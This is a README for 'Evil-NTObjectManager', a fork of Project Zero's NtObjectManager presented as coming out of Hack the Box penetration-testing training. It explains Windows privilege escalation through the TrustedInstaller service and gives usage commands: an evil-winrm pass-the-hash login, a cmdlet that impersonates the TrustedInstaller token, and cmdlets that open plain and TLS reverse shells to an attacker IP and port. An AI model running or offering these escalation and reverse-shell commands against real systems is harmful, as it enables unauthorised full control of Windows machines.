# Evil-NTObjectManager: Fork of NtObjectManager from Google Project Zero with Additional Privilege Escalation Functionality

While going through the [Hack the Box Academy](https://academy.hackthebox.com) Penetration Tester Role Path (the course material for Hack the Box's all-powerful Certified Penetration Testing Specialist, or CPTS, certification), one of things I was tasked with doing was using the SeImpersonatePrivilege, SeDebugPrivilege, and other such escalation vectors within Windows targets to quickly and efficiently break out of restricted environments and find flags hidden in the target systems. In the Windows Privilege Escalation module, one of the ways in which this can be achieved is through manipulation of Windows services using the `sc.exe` binary, i.e. with the `binpath=` argument. However, there are a few caveats to this approach:

1. The process is very destructive and thus easily detectable by countermeasures that the target may have in place.
2. If you use `sc` to load, say, a Metasploit payload, it's not going to last for very long; you need to spawn a secondary shell quickly before the service start attempt times out.
3. If a service is already running, you need to stop it before you can configure it.

Knowing this, I thought to myself, "What core Windows services are stopped by default, have high privileges, and are easy to impersonate?" That's when I remembered that I had previously watched [this John Hammond video](https://youtu.be/Vj1uh89v-Sc?si=my7yy2IFgrFNsdYG) which mentioned one such service: the all-powerful [TrustedInstaller](https://reddit.com/r/Windows10/comments/17m3cyr/how_does_one_become_trustedinstaller/) which has some privileges, such as the ability to delete Windows core components or inject drivers deep into the C:\Windows\System32 directory, that even `NT AUTHORITY\SYSTEM` does not have. However, the method that Hammond outlines in the video was for a time a very tedious process that involved typing 7 so sequential commands into the PowerShell console just to grab the permission token. Was, that is, until now.

In this project, I've managed to wrap the entire process of starting TrustedInstaller only to immediately impersonate the token into one cmdlet: `Invoke-TrustedInstaller`. In addition, I've added two additional functions for spawning and fully backgrounding new reverse shells from entirely within the context of the highest privileged Windows service of them all.

## Usage

```bash
evil-winrm -i x.x.x.x -u Administrator -H 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -s "$PWD/Evil-NtObjectManager"
<SNIP>
*Evil-WinRM* PS C:\> TrustedInstaller.ps1
```

```powershell
Import-Module .\TrustedInstaller.ps1
```

```powershell
Invoke-TrustedInstaller
```

```powershell
Invoke-TIRevShell -IP x.x.x.x -Port 4444
Invoke-TIRevShellTLS -IP x.x.x.x -Port 4444
```